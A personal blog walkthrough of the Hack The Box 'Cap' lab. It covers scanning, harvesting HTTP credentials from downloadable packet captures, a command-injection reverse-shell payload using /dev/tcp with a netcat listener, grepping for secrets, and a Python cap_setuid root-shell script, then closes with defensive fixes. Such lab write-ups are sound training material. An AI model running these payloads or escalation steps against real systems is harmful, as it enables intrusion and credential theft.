---
layout: post
title: "Hack The Box: Cap (Easy) — My Experience"
date: 2025-09-10 12:00:00 -0500
categories: [CTF, HackTheBox]
tags: [htb, cap, ctf, walkthrough, enumeration, privilege-escalation]
pin: false
---

# Hack The Box: Cap (Easy)

I worked on Cap last month when I wanted something simple and focused. It was a good reminder that basic enumeration and reading the UI carefully often beats overthinking.

> Legal note: These notes reflect my experience on a legal training lab.

## First Impressions
The landing page hinted at packet captures and network stats. That immediately set my mindset: if a web app offers downloadable files, I should assume there’s sensitive data hiding in plain sight.

```bash
# Quick scan
export TARGET=<IP>
nmap -p- -sC -sV -oN nmap_full $TARGET
```

## The Small Win That Opened Everything
Exploring the site led me to a place where I could fetch or view capture files (pcaps). I grabbed what I could and inspected it locally. This box rewards patience: download → inspect → repeat.

```bash
# Pull a capture and inspect
curl -o traffic.pcap "http://$TARGET/data/1"  # path varies, concept is the same

# Quick peeks before opening a GUI
file traffic.pcap
strings -n 8 traffic.pcap | head

# Extract potential HTTP auth hints with tshark
tshark -r traffic.pcap -Y http.authorization -T fields -e http.authorization
```

If HTTP Basic credentials show up, decode and test them. Credentials in captures are more common than we want to admit. After validating, I used them to authenticate (SSH/web) and get a foothold.

## Getting a Shell
Once authenticated, I looked for anything that executed commands or touched the filesystem on my behalf. A tiny misconfiguration was all it took to land a shell.

```bash
# Listener
rlwrap nc -lvnp 4444

# Payload example
;bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'
```

## PrivEsc Thoughts
I kept the same flow I use on easy boxes: check sudo, SUIDs, cron, and app configs. On this host the name “Cap” is a hint—Linux capabilities. Finding a Python binary with `cap_setuid=ep` made escalation straightforward.

```bash
sudo -l || true
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null | grep -i cap_setuid || true
grep -R "PASS\|SECRET\|TOKEN" -n /var/www 2>/dev/null
```

If Python has `cap_setuid=ep`, this tiny script does the job:

```bash
python3 - <<'PY'
import os, pty
os.setuid(0)
pty.spawn('/bin/bash')
PY
```

## Flags
- User flag: collected after foothold
- Root flag: collected after escalation

## What I’d Fix If This Were My App
- Do not expose raw captures without sanitization
- Avoid storing credentials in any capture or log
- Lock down file endpoints and verify authorization

## What Stuck With Me
- Easy boxes still reward slow, careful reading of the UI
- Files you hand to users can leak more than you expect

---

Working in DevOps can feel fast‑paced. I move slower, and that’s sometimes looked down on—but that’s why my changes stick. Not knowing isn’t a bad thing—it forces investigation and growth.


